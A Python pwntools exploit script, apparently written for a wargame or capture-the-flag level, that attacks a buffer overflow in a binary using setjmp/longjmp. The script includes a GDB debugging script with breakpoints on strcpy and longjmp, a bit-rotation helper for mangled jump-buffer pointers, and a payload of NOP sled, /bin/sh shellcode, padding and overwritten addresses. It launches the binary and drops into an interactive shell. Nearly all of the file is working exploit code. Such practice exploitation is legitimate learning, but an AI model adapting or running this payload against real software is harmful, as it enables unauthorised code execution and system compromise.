from lib.exploit import *


gdb_script = '''
set disassembly-flavor intel   
set follow-fork-mode child
# alias gil = disassemble
set print pretty on
set print array on


define show_ret
x/2wx $ebp
end

define show_args
x/3wx $esp
end

define nextt
si
finish
end

# find env vars
define show_stack
x/20wx $ebp
end












unset env
show env

define show_buf
p/x *jbp
end

define show_buf_stack
p/x *(jmp_buf *)0xffffcd7c
end

# b *vuln
# b *_setjmp


# call strcpy
b *0x80484e8
b *longjmp
# after long jmp
b *0x080484d5


r "`cat ./payload`"


# long jump
b *0xf7dfab80


'''

LEVEL = "7"

def prepare_env(s):
    if not LOCAL:
        s.process(["rm", "-rf", CWD]).recvall()
        s.process(["mkdir", CWD]).recvall()
    upload(s, gdb_script, CWD + "gdb.script")


s = connect_to_local(LEVEL, "totiquegae", remote=False)
# s = connect(LEVEL, "totiquegae")
from lib.exploit import *
prepare_env(s)

jmp_buf_global = 0x08049868


def rotate_left(l, n):
    bin_s = bin(l).zfill(32)[2:]
    len(bin_s)
    log.info(f"bin_s: {bin_s}")
    r = bin_s[n:] + bin_s[:n]
    len(r)
    log.info(f"r: {r}")
    num = int(r, 2)
    log.info(f"num: {num}")
    return num


# memory_snapshot = '''
# 0xfd91e822 0x0b205dcd 0x00000000 0x00000019
# 0xffffdd2c 0xf7e41f97 0xf7fabd20 0x080485d0
# 0xf7fabd20 0xf7e42423 0xf7fabd20 0x0804a1a0
# 0x0000001a 0x00000001 0x00000001 0x00000000
# 0xf7e42f79 0xf7fac5e0 0xf7fabd20 0x00000019
# 0xffffdd2c 0xf7e3660b 0xf7fabd20 0x0000000a
# 0x00000017 0xf7fab3fc
# '''

alpha_amount = 140
alpha_g = cyclic_gen(alphabet=string.ascii_uppercase)
alpha_g.get(alpha_amount)


# jmp_adr = ret_adr + 25

# pos, chunk, index = alpha_g.find(b"ZAAB")
# log.info(f"pos: {pos}")
# padding = bytes(alpha_g.get(alpha_amount)[:pos], "utf-8")
# padding = padding.replace(b"ZAAB", pack(0xcafebeef, 32)) -> i did it manually
# pos = 100

base_pointer = 0xffffdc6c
buf_adr = 0xffffdc0c

code = pwnlib.shellcraft.i386.sh()
log.info(f"code: {code}")

sh = asm(pwnlib.shellcraft.i386.sh())

log.info(f"sh: {sh}")

len_sh = len(sh)
log.info(f"len_sh: {len_sh}")


# sh = b"//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"

payload = b""
payload += b"\x90"*10
payload += sh
payload = pad(payload, 100)
payload += pack(buf_adr+5, 32)
payload = pad(payload, 140)
payload += pack(base_pointer, 32)


log.info(f"payload: {payload}")
len_payload = len(payload)
log.info(f"len_payload: {len_payload}")


upload(s, payload, CWD+"payload")

io = s.process(["env", "-i", BINARY_PATH, payload])
r = io.recvline()
log.info(f"r: {r}")

io.interactive()
